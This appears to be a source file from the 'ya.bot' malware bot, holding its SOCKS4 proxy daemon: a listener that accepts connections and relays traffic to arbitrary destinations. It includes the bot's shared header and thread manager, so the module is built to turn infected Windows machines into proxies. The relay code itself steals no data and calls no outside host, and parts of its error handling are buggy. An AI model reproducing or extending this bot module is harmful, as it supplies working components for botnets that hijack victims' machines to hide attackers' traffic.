/*  ya.bot  */

#include "..\bot\bot.h"

#ifndef NO_DAEMONSOCKS4
DWORD WINAPI daemon_socks4handler(LPVOID param)
{
	char szBuffer[BIGBUF];
	FD_SET fdset;
	SDaemonSOCKS4Info s_dsi4;
	sockaddr_in sin;
	SOCKET csock = (SOCKET)param, sock;

#ifndef NO_DEBUG
		debug_print("Handling socks4 connection, daemon_socks4handler()");
#endif

	if (recv(csock, (char *)&s_dsi4, sizeof(s_dsi4), 0) == SOCKET_ERROR)
	{
			closesocket(0);
			return 0;
	}
	if ((s_dsi4.m_byVn == 4) && (s_dsi4.m_byCd == 1))
	{
			sin.sin_addr.s_addr = s_dsi4.m_dwDstIp;
			sin.sin_family = AF_INET;
			sin.sin_port = s_dsi4.m_wDstPort;
			sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (sock == INVALID_SOCKET)
		{
				s_dsi4.m_byVn = 0;
				s_dsi4.m_byCd = 91;
				send(csock, (char *)&s_dsi4, 8, 0);
				closesocket(0);
				return 0;
		}
		if (connect(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
		{
				s_dsi4.m_byVn = 0;
				s_dsi4.m_byCd = 91;
				send(csock, (char *)&s_dsi4, 8, 0);
				closesocket(0);
				return 0;
		}
			s_dsi4.m_byVn = 0;
			s_dsi4.m_byCd = 90;
			send(csock, (char *)&s_dsi4, 8, 0);
		while (TRUE)
		{
				FD_ZERO(&fdset);
				FD_SET(csock, &fdset);
				FD_SET(sock, &fdset);
				memset(szBuffer, 0, sizeof(szBuffer));
			if (select(0, &fdset, NULL, 0, NULL) == SOCKET_ERROR)
					break;
			if (FD_ISSET(csock, &fdset))
			{
				if (recv(csock, szBuffer, sizeof(szBuffer) - 1, 0) == SOCKET_ERROR)
						break;
				if (send(sock, szBuffer, strlen(szBuffer), 0) == SOCKET_ERROR)
						break;
			}
			if (FD_ISSET(sock, &fdset))
			{
				if (recv(sock, szBuffer, sizeof(szBuffer) - 1, 0) == SOCKET_ERROR)
						break;
				if (send(csock, szBuffer, strlen(szBuffer), 0) == SOCKET_ERROR)
						break;
			}
				Sleep(10);
		}
	}
		closesocket(csock);
		return 0;
}

DWORD WINAPI daemon_socks4main(LPVOID param)
{
	register int nSize;
	sockaddr_in sin;
	SDaemonSOCKS4 s_ds4 = *((SDaemonSOCKS4 *)param);
	SOCKET sock, csock;

#ifndef NO_DEBUG
		debug_print("Starting socks4 daemon, daemon_socks4main()");
#endif

		sin.sin_addr.s_addr = INADDR_ANY;
		sin.sin_family = AF_INET;
		sin.sin_port = htons(s_ds4.m_nPort);
		nSize = sizeof(sin);
		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
	{
			thread_remove(THREAD_DAEMONSOCKS4);
			return 0;
	}
	if (bind(sock, (sockaddr *)&sin, nSize) == SOCKET_ERROR)
	{
			closesocket(sock);
			thread_remove(THREAD_DAEMONSOCKS4);
			return 0;
	}
	if (listen(sock, 10) == SOCKET_ERROR)
	{
			closesocket(sock);
			thread_remove(THREAD_DAEMONSOCKS4);
			return 0;
	}
	while (TRUE)
	{
			csock = accept(sock, (sockaddr *)&sin, &nSize);
		if (csock != INVALID_SOCKET)
				CreateThread(NULL,
						0,
						&daemon_socks4handler,
						(void *)csock,
						0,
						NULL);
	}
		closesocket(csock);
		closesocket(sock);
		thread_remove(THREAD_DAEMONSOCKS4);
		return 0;
}
#endif